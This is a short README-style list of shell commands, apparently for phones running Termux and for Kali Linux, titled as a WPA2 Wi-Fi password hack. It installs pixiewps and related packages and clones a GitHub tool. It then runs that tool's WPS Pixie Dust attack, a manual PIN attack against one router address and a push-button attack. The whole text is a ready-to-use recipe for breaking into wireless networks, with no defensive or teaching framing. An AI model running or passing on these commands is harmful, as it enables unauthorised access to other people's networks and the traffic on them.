# Wi-Fi PassWord only WPA2 HACK

pkg install -y root-repo

pkg install -y git tsu python wpa-supplicant pixiewps iw openssl

# download only root user

apt-get install build-essential
apt-get install libpcap-dev
apt-get install sqlite3
apt-get install libsqlite3-dev
apt-get install pixiewps

# installing Tool ComMand

pkg install git

pkg install python3


git clone https://github.com/HeartHaNterAlex/wifi


# only one command run


sudo python wifi/ps.py -i wlan1 -K
# kali command 
sudo python wifi/kali-ps.py -i wlan1 -K

# select Host number press inter attack 

# manual pin attack 🧷

sudo python3 ps.py -i wlan0 -b d9:90:4C:C9:D0:A7 -B -p 1234

sudo python3 ps.py -i wlan0 --pbc
